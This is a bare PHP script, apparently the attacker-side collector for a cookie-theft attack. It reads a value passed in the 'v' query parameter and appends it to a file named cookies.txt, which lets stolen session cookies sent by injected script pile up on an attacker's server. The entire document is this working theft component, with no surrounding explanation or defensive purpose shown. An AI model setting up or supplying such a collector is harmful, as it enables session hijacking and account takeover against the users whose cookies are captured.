<?php
  $cookie = $_GET['v'] . "\n";
  file_put_contents("cookies.txt", $cookie, FILE_APPEND | LOCK_EX);
?>
